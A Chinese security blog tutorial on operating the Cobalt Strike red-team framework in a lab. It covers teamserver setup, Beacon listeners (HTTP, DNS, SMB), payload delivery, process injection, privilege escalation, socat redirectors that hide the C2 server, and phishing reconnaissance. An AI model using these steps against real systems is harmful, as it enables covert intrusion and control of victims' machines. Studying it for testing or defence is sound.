@@ -1,0 +1,1706 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="CobaltStrike使用, Duの博客">
+    <meta name="description" content="0x00 工具介绍Cobalt Strike是一款渗透测试神器，常被业界人称为CS神器,因其优良的团队协作性，被冠以多人运动的必备利器。Cobalt Strike已经不再使用MSF而是作为单独的平台使用，它分为客户端与服务端，服务端是一个，">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    
+
+    <title>CobaltStrike使用 | Duの博客</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Duの博客</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Duの博客</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://du8848.github.io/" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://du8848.github.io/" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">CobaltStrike使用</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/tools/">
+                                <span class="chip bg-color">tools</span>
+                            </a>
+                        
+                            <a href="/tags/CobaltStrike/">
+                                <span class="chip bg-color">CobaltStrike</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/CobaltStrike/" class="post-category">
+                                CobaltStrike
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2022-05-13
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="0x00-工具介绍"><a href="#0x00-工具介绍" class="headerlink" title="0x00 工具介绍"></a>0x00 工具介绍</h2><p>Cobalt Strike是一款渗透测试神器，常被业界人称为CS神器,因其优良的团队协作性，被冠以多人运动的必备利器。Cobalt Strike已经不再使用MSF而是作为单独的平台使用，它分为客户端与服务端，服务端是一个，客户端可以有多个，可被团队进行分布式协团操作。<br>Cobalt Strike集成了端口转发、扫描多模式端口Listener、Windows exe程序生成、Windows dll动态链接库生成、java程序生成、office宏代码生成，包括站点克隆获取浏览器的相关信息等。<br>早期版本Cobalt Srtike依赖Metasploit框架，而现在Cobalt Strike已经不再使用MSF而是作为单独的平台使用。</p>
+<h2 id="0x01-基础操作"><a href="#0x01-基础操作" class="headerlink" title="0x01 基础操作"></a>0x01 基础操作</h2><h3 id="客户端与服务端的连接"><a href="#客户端与服务端的连接" class="headerlink" title="客户端与服务端的连接"></a>客户端与服务端的连接</h3><p>Cobalt Strike使用C&#x2F;S架构，Cobalt Strike的客户端连接到团队服务器，团队服务器连接到目标，也就是说Cobalt Strike的客户端不与目标服务器进行交互。</p>
+<h4 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h4><p>Cobalt Strike的客户端想连接到团队服务器需要知道三个信息：</p>
+<ul>
+<li>团队服务器的外部IP地址</li>
+<li>团队服务器的连接密码</li>
+<li>决定Malleable C2工具的哪一个用户配置文件被用于团队服务器（此项可选）</li>
+</ul>
+<p>知道这些信息后，就可以使用脚本开启团队服务器了，值得注意的是Cobalt Strike团队服务器只能运行在Linux环境下。</p>
+<h4 id="开启团队服务器"><a href="#开启团队服务器" class="headerlink" title="开启团队服务器"></a>开启团队服务器</h4><p>开启团队服务器命令一般如下：</p>
+<blockquote>
+<p>.&#x2F;teamserver your_ip your_passowrd [config_file] </p>
+</blockquote>
+<p><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/1.png"></p>
+<p>服务端开启后，就可以开启客户端进行连接了</p>
+<h4 id="连接到团队服务器"><a href="#连接到团队服务器" class="headerlink" title="连接到团队服务器"></a>连接到团队服务器</h4><p>在Linux下，直接运行start.sh脚本文件，输入团队服务器的IP、密码和自己的用户名进行连接</p>
+<p><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/2.png"></p>
+<p>点击Connect连接后，会有个提示信息，如果承认提示信息中的哈希值就是所要连接团队服务器的哈希值就点击Yes，随后即可打开CS客户端界面</p>
+<p><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/3.png"></p>
+<p>在Windows下的连接方法也基本一致，直接双击start.bat文件，输入IP、密码、用户名，点击Connect即可</p>
+<p><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/4.png"><br><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/5.png"></p>
+<p>在连接后，团队之间就可以通过客户端进行沟通，信息共享</p>
+<p><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/6.png"></p>
+<p>Cobalt Strike不是用来设计指导在一个团队服务器下进行工作的，而是被设计成在一次行动中使用多个团队服务器。<br>这样设计的目的主要在于运行安全，如果一个团队服务器停止运行了，也不会导致整个行动的失败。</p>
+<h4 id="连接到多个团队服务器"><a href="#连接到多个团队服务器" class="headerlink" title="连接到多个团队服务器"></a>连接到多个团队服务器</h4><p>Cobalt Strike连接到多个团队服务器也很简单，直接点击左上角的加号，输入其他团队服务器的信息后，即可连接</p>
+<p><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/7.png"></p>
+<h3 id="监听器、传输器"><a href="#监听器、传输器" class="headerlink" title="监听器、传输器"></a>监听器、传输器</h3><ul>
+<li>什么是监听器<br>顾名思义，监听器就是等待被入侵系统连接自己的一个服务。</li>
+<li>监听器的作用<br>主要是为了接受payload回传的各类数据，类似于MSF中handler的作用。<br>比如payload在目标机器执行以后，就会回连到监听器然后下载执行真正的shellcode代码。</li>
+</ul>
+<p>一旦监听器建立起来，团队成员只需要知道这个监听器的名称即可，不用关心监听器背后的基础环境。<br>一个监听器由用户定义的名称、payload 类型和几个特定于 payload 的选项组成。</p>
+<blockquote>
+<p>监听器的名字一般由以下结构组成：<br>Operating System&#x2F;Payload&#x2F;Stager<br>例如：<br>windows&#x2F;beacon_http&#x2F;reverse_http</p>
+</blockquote>
+<ul>
+<li>什么是传输器<br>攻击载荷payload就是攻击执行的内容。攻击载荷通常被分为两部分：传输器stager 和传输体stage。<br>传输器stager是一个小程序，用于连接、下载传输体stage，并插入到内存中。<br>需要传输体是因为在很多攻击中对于能加载进内存，并在成功漏洞利用后执行的数据大小存在严格限制。这就导致在攻击成功时，很难嵌入额外的攻击载荷，正是因为这些限制，才使得传输器变得有必要了。</li>
+</ul>
+<p><strong>创建监听器</strong><br>在CS客户端中打开 Cobalt Strike —&gt; Listeners，之后点击Add，此时弹出New Listener窗口，在填写监听器的相关信息之前，需要先来了解监听器有哪些类型。<br>Cobalt Strike有两种类型的监听器：</p>
+<ul>
+<li>Beacon<br>Beacon直译过来就是灯塔、信标、照亮指引的意思，Beacon是较为隐蔽的后渗透代理。</li>
+</ul>
+<blockquote>
+<p>Beacon监听器的名称例如：<br>windows&#x2F;beacon_http&#x2F;reverse_http</p>
+<p>Foreign<br>Foreign直译就是外部的，可以理解成对外监听器，这种类型的监听器主要作用是给其他的Payload提供别名，比如Metasploit 框架里的Payload。<br>对外监听器的名称例如：<br>windows&#x2F;foreign&#x2F;reverse_https</p>
+</blockquote>
+<ul>
+<li>Beacon是什么</li>
+</ul>
+<ol>
+<li>Beacon是CS的Payload。</li>
+<li>Beacon有两种通信模式。一种是异步通信模式，这种模式通信效率缓慢，Beacon回连团队服务器、下载任务、然后休眠；另一种是交互式通信模式，这种模式的通信是实时发生的。</li>
+<li>通过HTTP、HTTPS和DNS出口网络。</li>
+<li>使用SMB协议的时候是点对点通信。</li>
+<li>Beacon有很多的后渗透攻击模块和远程管理工具。</li>
+</ol>
+<p><strong>Beacon的类型</strong></p>
+<h4 id="HTTP-和-HTTPS-Beacon"><a href="#HTTP-和-HTTPS-Beacon" class="headerlink" title="HTTP 和 HTTPS Beacon"></a>HTTP 和 HTTPS Beacon</h4><p>HTTP和HTTPS Beacon也可以叫做Web Beacon。默认设置情况下，HTTP 和 HTTPS Beacon 通过 HTTP GET 请求来下载任务。这些 Beacon 通过 HTTP POST 请求传回数据。</p>
+<blockquote>
+<p>windows&#x2F;beacon_http&#x2F;reverse_http<br>windows&#x2F;beacon_https&#x2F;reverse_https</p>
+</blockquote>
+<p><strong>创建一个HTTP Beacon</strong><br>点击 Cobalt Strike –&gt; Listeners 打开监听器管理窗口，点击Add，输入监听器的名称、监听主机地址，因为这里是要创建一个HTTP Beacon，所以其他的默认就行，最后点击Save</p>
+<p><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/8.png"></p>
+<p>此时可以测试一下刚才设置的监听器，点击Attack –&gt; Web Drive-by –&gt; Scripted Web Delivery(s) ，在弹出的窗口中选择刚才新添的Listener，因为我的靶机是64位的，所以我把Use x64 payload也给勾选上了，最后点击Launch</p>
+<p><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/9.png"></p>
+<p>复制弹窗的命令，放到靶机中运行</p>
+<p><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/10.png"></p>
+<p><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/11.png"></p>
+<p>此时，回到CS，就可以看到已经靶机上线了</p>
+<p><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/12.png"></p>
+<p><strong>HTTPS Beacon</strong></p>
+<p>HTTPS Beaocn和HTTP Beacon一样，使用了相同的Malleable C2配置文件，使用GET和POST的方式传输数据，不同点在于HTTPS使用了SSL，因此HTTPS Beacon就需要使用一个有效的SSL证书，具体如何配置可以参考：<a target="_blank" rel="noopener" href="https://www.cobaltstrike.com/help-malleable-c2#validssl">https://www.cobaltstrike.com/help-malleable-c2#validssl</a> (opens new window)</p>
+<h4 id="DNS-Beacon"><a href="#DNS-Beacon" class="headerlink" title="DNS Beacon"></a>DNS Beacon</h4><p>DNS Beacon，顾名思义就是使用DNS请求将Beacon返回。这些 DNS 请求用于解析由你的 CS 团队服务器作为权威 DNS 服务器的域名。DNS 响应告诉 Beacon 休眠或是连接到团队服务器来下载任务。DNS 响应也告诉 Beacon 如何从你的团队服务器下载任务。</p>
+<p>在CS 4.0及之后的版本中，DNS Beacon是一个仅DNS的Payload，在这个Payload中没有HTTP通信模式，这是与之前不同的地方。</p>
+<p><strong>DNS Beacon的工作流程具体如下：</strong><br>首先，CS服务器向目标发起攻击，将DNS Beacon传输器嵌入到目标主机内存中，然后在目标主机上的DNS Beacon传输器回连下载CS服务器上的DNS Beacon传输体，当DNS Beacon在内存中启动后就开始回连CS服务器，然后执行来自CS服务器的各种任务请求。<br>原本DNS Beacon可以使用两种方式进行传输，一种是使用HTTP来下载Payload，一种是使用DNS TXT记录来下载Payload，不过现在4.0版本中，已经没有了HTTP方式，CS4.0以及未来版本都只有DNS TXT记录这一种选择了。</p>
+<p>DNS Beacon拥有更高的隐蔽性，但是速度相对于HTTP Beacon什么的会更慢</p>
+<blockquote>
+<p>windows&#x2F;beacon_dns&#x2F;reverse_dns_txt<br>windows&#x2F;beacon_dns&#x2F;reverse_http</p>
+</blockquote>
+<p><strong>创建一个DNS Beacon</strong></p>
+<p>域名配置</p>
+<p>既然是配置域名，所以就需要先有个域名，添加一条A记录指向CS服务器的公网IP，再添加几条ns记录指向A记录域名即可。<br><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/13.png"></p>
+<p>添加一个监听器，DNS Hosts填写NS记录和A记录对应的名称，DNS Host填写A记录对应的名称 。<br><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/14.png"></p>
+<p>根据上一章的方法创建一个攻击脚本，放到目标主机中运行后，在CS客户端可以看到一个小黑框。</p>
+<p><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/15.png"></p>
+<p>然后经过一段时间的等待，就可以发现已经上线了</p>
+<p><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/16.png"></p>
+<h4 id="SMB-Beacon"><a href="#SMB-Beacon" class="headerlink" title="SMB Beacon"></a>SMB Beacon</h4><p>SMB Beacon也可以叫做pipe beacon</p>
+<blockquote>
+<p>windows&#x2F;beacon_smb&#x2F;bind_pipe</p>
+</blockquote>
+<p>SMB Beacon 使用命名管道通过一个父 Beacon 进行通信。这种对等通信对同一台主机上的 Beacon 和跨网络的 Beacon 都有效。Windows 将命名管道通信封装在 SMB 协议中。因此得名 SMB Beacon。<br>因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效(系统防火墙默认是允许445的端口与外界通信的，其他端口可能会弹窗提醒，会导致远程命令行反弹shell失败)。<br>SMB Beacon监听器对“提升权限”和“横向渗透”中很有用。</p>
+<p><strong>SMB Beacon 配置</strong><br>首先需要一个上线的主机，这里我使用的HTTP Beacon。<br>主机上线后，新建一个SMB Beacon，输入监听器名称，选择Beacon SMB，管道名称可以直接默认，也可以自定义。<br><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/17.png"></p>
+<p>接下来在Beacon中直接输入spawn SMB，这里的SMB指代的是创建的SMB Beacon的监听器名称，也可以直接右击session，在Spawn选项中选择刚添加的SMB Beacon。<br><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/18.png"></p>
+<p>等待一会儿，就可以看到派生的SMB Beacon，在external中可以看到IP后有个∞∞字符。<br>接下来我这里将SMB Beacon插入到进程中，以vmtoolsed进程为例。</p>
+<p><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/19.png"></p>
+<p>在vmtoolsed中插入SMB Beacon后，便能看到process为vmtoolsed.exe的派生SMB Beacon。<br>当上线主机较多的时候，只靠列表的方式去展现，就显得不太直观了，通过CS客户端中的透视图便能很好的展现。</p>
+<p><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/20.png"></p>
+<p>在CS中，如果获取到目标的管理员权限，在用户名后会有<code>*</code>号标注，通过这个区别，可以判断出当前上线的test用户为普通权限用户，因此这里给他提升一下权限。</p>
+<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>由于CS自带的提权方式较少，因此这里就先加载一些网上的提权脚本，脚本下载地址为： <a target="_blank" rel="noopener" href="https://github.com/rsmudge/ElevateKit">https://github.com/rsmudge/ElevateKit</a> (opens new window)<br>下载之后，打开Cobalt Strike –&gt; Script Manager ，之后点击Load，选择自己刚才下载的文件中的elevate.cna文件。<br><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/21.png"></p>
+<p>接着选择要提权的主机，右击选择Access –&gt; Elevate，Listener中选择刚才新建的SMB Beacon，这里的Exploit选择了ms14-058，如果使用ms14-058不能提权，就换一个Exploit进行尝试。</p>
+<p><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/22.png"></p>
+<p>顺利的情况下，就可以看到提权后的管理员权限会话了，在管理员权限的会话中，不光用户名后有个<code>*</code>号，其Logo也是和其他会话不同的。</p>
+<p><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/23.png"></p>
+<h4 id="连接与断开"><a href="#连接与断开" class="headerlink" title="连接与断开"></a>连接与断开</h4><p>此时如果想断开某个会话的连接，可以使用unlink命令，比如如果想断开192.168.175.144，就可以在Beacon中输入</p>
+<blockquote>
+<p>unlink 192.168.175.144</p>
+</blockquote>
+<p><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/24.png"></p>
+<p>如果想再次连上，就直接输入link 192.168.175.144，想从当前主机连到其他主机也可以使用此命令。</p>
+<h3 id="重定向器"><a href="#重定向器" class="headerlink" title="重定向器"></a>重定向器</h3><p>重定向器Redirectors是一个位于CS团队服务器和目标网络之间的服务器，这个重定向器通俗的来说就是一个代理工具，或者说端口转发工具，担任CS服务器与目标服务器之间的跳板机角色，整体流量就像下面这样。<br>目标靶机 &lt;——–&gt;多个并列的重定向器&lt;——&gt;CS服务器</p>
+<p>重定向器在平时的攻击或者防御的过程中起到很重要的作用，主要有以下两点：</p>
+<ul>
+<li>保护自己的CS服务器，避免目标发现自己的真实IP</li>
+<li>提高整体可靠性，因为可以设置多个重定向器，因此如果有个别重定向器停止工作了，整体上系统依旧是可以正常工作的</li>
+</ul>
+<p><strong>创建一个重定向器</strong></p>
+<blockquote>
+<p>CS服务器IP：192.168.175.129<br>目标靶机IP：192.168.175.130<br>重定向器IP：192.168.175.132、192.168.175.133</p>
+</blockquote>
+<p>首先，需要先配置重定向器的端口转发，比如这里使用HTTP Beacon，就需要将重定向器的80端口流量全部转发到CS服务器上，使用socat的命令如下：<br>socat TCP4-LISTEN:80,fork TCP4:192.168.175.129:80</p>
+<p><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/25.png"><br><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/26.png"></p>
+<p>如果提示没有socat命令，安装一下即可。重定向器设置好之后，就新建一个HTTP Beacon，并把重定向器添加到HTTP Hosts主机列表中</p>
+<p><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/27.png"></p>
+<p>此时可以测试一下重定向器是否正常工作，在CS中打开 View –&gt; Web Log，之后浏览器访问CS服务器地址，也就是这里的192.168.175.129</p>
+<p><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/28.png"></p>
+<p><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/29.png"></p>
+<p>可以看到CS是能够正常接收到流量的，说明重定向器已经配置OK了，此时按照上面创建一个HTTP Beacon的操作，创建一个HTTP Beacon，并在靶机中运行<br>当靶机上线的时候，观察靶机中的流量，可以看到与靶机连接的也是重定向器的IP<br><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/30.png"></p>
+<p>在CS中也可以看到上线主机的外部IP也是重定向器的IP，此时如果关闭一个重定向器，系统依旧可以正常工作。</p>
+<p><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/31.png"></p>
+<h2 id="0x02-目标攻击"><a href="#0x02-目标攻击" class="headerlink" title="0x02 目标攻击"></a>0x02 目标攻击</h2><p>“红蓝大战”持续至今，诞生了各种WAF、防火墙。各种漏洞已经很难像过去那么好被利用了，攻击者想绕过防火墙发动攻击也不是那么容易的了。</p>
+<p>而当我们发送一个钓鱼文件到目标机上，再在目标机上打开这个文件，最后目标机穿过防火墙回连到我们的服务，此时在目标机客户端上我们就获得了一个立足点。</p>
+<h3 id="系统侦察"><a href="#系统侦察" class="headerlink" title="系统侦察"></a>系统侦察</h3><p>系统侦察System Profiler是一个方便客户端攻击的侦察工具，这个工具将会在CS服务端上启动一个Web服务，这样当目标访问这个Web服务的时候，我们就能够看到目标使用的浏览器、操作系统等等指纹信息。<br>设置系统侦察需要首先在自己的VPS服务器上运行CS服务端，之后本地客户端进行连接，选择System Profiler功能模块，配置待跳转的URL等信息即可。<br>如果勾选了Use Java Applet to get information则可以发现目标的Java版本及内网IP地址，但是这样做被发现的风险就会提高，同时现在浏览器已经默认关闭了java执行权限，因此这个选项的作用也变得不大了。不过，工控网络可以尝试一下。</p>
+<p><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/32.png"></p>
+<p>配置完后，当用户打开配置后的链接，我们可以在三个地方进行观察</p>
+<ol>
+<li>View –&gt; Applications</li>
+<li>View –&gt; Web Log</li>
+<li>Cobalt Strike –&gt; Visualization –&gt; Target Table</li>
+</ol>
+<p>目标用户打开链接时，我们在CS上就能够看到目标使用的浏览器版本、系统版本等信息了，知道了版本信息，就能够进一步知道目标上可能存在什么漏洞。<br><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/33.png"></p>
+<p>值得注意的一点是如果 Cobalt Strike 的 web 服务器收到了lynx、wget 或 curl 的请求，CS会自动返回一个 404 页面，这样做是为了防御蓝队的窥探。</p>
